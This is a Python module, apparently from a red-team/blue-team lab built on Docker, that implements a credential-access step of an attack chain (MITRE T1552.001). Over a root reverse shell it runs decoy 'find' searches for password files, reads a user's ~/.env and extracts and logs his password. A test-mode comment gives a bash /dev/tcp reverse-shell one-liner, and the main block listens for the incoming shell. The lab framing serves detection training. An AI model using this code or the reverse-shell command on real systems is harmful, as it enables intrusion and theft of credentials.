import re
import shlex
import socket
import time

from chainlog import log, run_remote

# =============================================================================
# credential_access.py — Discover internal credentials from john's .env
# MITRE ATT&CK:
#   T1552.001 – Credentials In Files     (read john's ~/.env on apache)
# -----------------------------------------------------------------------------
# Runs FROM apache via the root reverse shell.
# Searches for common sensitive file patterns (noise) then reads john's ~/.env
# file to recover his password.  Network discovery and credential stuffing are
# handled in lateral_movement.py.
# =============================================================================

ENV_FILE_PATH = "/home/john.stravidis/.env"
TARGET_USERNAME = "john.stravidis"

# Noise file patterns searched before the real .env read (T1552.001).
# Each tuple is (filename, list_of_dirs_to_search).  All searches are
# expected to come up empty — the point is to generate observable events in
# the scenario log and the apache shell history that a blue team can correlate.
_NOISE_FILE_PATTERNS = [
    (
        "passwords.txt",
        ["/home", "/root", "/tmp", "/var/www", "/opt"],
    ),  # /var/www: web-app credential dumps
    (
        "secrets.json",
        ["/home", "/root", "/tmp", "/var/www", "/opt"],
    ),  # /var/www: web-app credential dumps
    (
        "config.backup",
        ["/home", "/root", "/tmp", "/etc", "/opt"],
    ),  # /etc: sysadmin backup destination
    ("credentials.txt", ["/home", "/root", "/tmp", "/opt"]),
    (".passwd", ["/home", "/root", "/opt"]),
    ("db_password.txt", ["/home", "/root", "/opt"]),
]


def _extract_password(env_text, var_names=("WS_PASS", "JOHN_PASS", "PASSWORD")):
    """Pull the first matching `VAR=value` line out of an .env blob."""
    for var in var_names:
        m = re.search(rf"^{re.escape(var)}=(.+)$", env_text, re.MULTILINE)
        if m:
            return m.group(1).strip().strip('"').strip("'")
    return None


def _search_noise_files(shell):
    """Search for common sensitive file patterns via the root shell.

    All searches are expected to return nothing — the function exists purely
    to generate log-visible noise events (T1552.001) that a blue team can
    observe when analysing the scenario.  The log lines and the `find`
    commands sent through the shell both appear in scenario logs and apache
    shell history respectively.

    Matches are detected via a `-printf` marker rather than "any output":
    the root reverse shell echoes a PS1 prompt (and, on some shells, the
    command itself) into every `_run_remote` capture, so a plain emptiness
    check would treat that prompt noise as a hit and fire the `[?]` branch on
    every pattern.  Only lines carrying the `CS_NOISE_HIT` marker count as
    real finds.
    """
    log("[*] Expanding credential search to common sensitive file patterns...")
    any_hits = False
    for filename, dirs in _NOISE_FILE_PATTERNS:
        search_dirs = " ".join(dirs)
        cmd = (
            f"find {search_dirs} -maxdepth 4 -name {shlex.quote(filename)} "
            f"-printf 'CS_NOISE_HIT %p\\n' 2>/dev/null"
        )
        out = run_remote(shell, cmd, timeout=10)
        hits = [
            line[len("CS_NOISE_HIT ") :]
            for line in out.splitlines()
            if line.startswith("CS_NOISE_HIT ")
        ]
        if hits:
            any_hits = True
            log(f"[?] Unexpected find for {filename!r}: {', '.join(hits)}")
        else:
            log(f"[-] {filename!r} not found in {search_dirs}")
    if any_hits:
        log("[*] Noise search complete — unexpected file(s) noted above")
    else:
        log("[*] Noise search complete — no additional credential files discovered")


def run(root_shell, target_user=TARGET_USERNAME):
    """
    Execute the credential-discovery step on apache via the root shell.

    Searches for sensitive file patterns (noise) then reads john's .env file
    to recover his password.  Network discovery and credential stuffing against
    internal hosts are handled by the lateral movement step.

    Returns a dict with:
        john_password — the password recovered from the env file (or None)
    """
    log("\n[*] Starting credential discovery...")

    # ------------------------------------------------------------------
    # Phase 1 — Credentials in files (T1552.001)
    # Noise searches first (always fail), then the real .env read.
    # ------------------------------------------------------------------
    _search_noise_files(root_shell)
    log(f"[*] Reading {ENV_FILE_PATH} on apache...")
    env_blob = run_remote(root_shell, f"cat {ENV_FILE_PATH}", timeout=10)
    password = _extract_password(env_blob)
    if not password:
        log(f"[-] No usable password variable found in {ENV_FILE_PATH}")
        log(f"[?] File contents: {env_blob!r}")
        return {"john_password": None}
    log(f"[+] Recovered credential: {target_user} / {password}")

    return {"john_password": password}


# Test mode — same pattern as the other chain modules.
# Usage: docker compose exec kali python3 /Attack-chain/credential_access.py
# Then in another terminal, on apache:
#   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
if __name__ == "__main__":
    log("[*] Test mode — waiting for root shell on port 5555")

    test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    test_server.bind(("0.0.0.0", 5555))
    test_server.listen(1)

    try:
        root_shell_sock, addr = test_server.accept()
        log(f"[+] Root shell received from {addr[0]}")
    finally:
        test_server.close()

    result = run(root_shell_sock)
    log(f"\n[*] Result: {result}")
